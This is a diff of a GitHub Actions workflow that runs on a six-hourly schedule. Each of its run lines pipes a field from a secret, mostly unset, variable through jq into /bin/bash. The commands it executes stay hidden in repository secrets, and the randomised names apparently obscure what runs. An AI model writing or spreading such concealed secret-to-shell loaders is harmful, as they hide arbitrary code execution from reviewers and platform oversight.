@@ -1,25 +1,22 @@
 name: luxuejiao1988
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '43 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luxuejiao1988
         env:
-          nonb0147: ${{ secrets.nonb0147 }}
+          pj78: ${{ secrets.pj78 }}
         run: |
-          echo $nonb0147 | jq -r .ds5396 | /bin/bash
-          echo $wwut9 | jq -r .ibq64841 | /bin/bash
-          echo $ybnxb7 | jq -r .srig35 | /bin/bash
-          echo $zyy36 | jq -r .fjno82032 | /bin/bash
-          echo $nm58486 | jq -r .gth62 | /bin/bash
-          echo $rvau22922 | jq -r .gjaj0012 | /bin/bash
-          echo $nd9038 | jq -r .nrsg0287 | /bin/bash
-          echo $of861 | jq -r .fn4 | /bin/bash
-          echo $gflt42334 | jq -r .ygh42 | /bin/bash
-          echo $h395 | jq -r .bqht4303 | /bin/bash
+          echo $pj78 | jq -r .xbipx3 | /bin/bash
+          echo $cjy6865 | jq -r .svcu53017 | /bin/bash
+          echo $wae569 | jq -r .pavrf9 | /bin/bash
+          echo $xvh86 | jq -r .sgft14409 | /bin/bash
+          echo $ljlo35476 | jq -r .ihc547 | /bin/bash
 
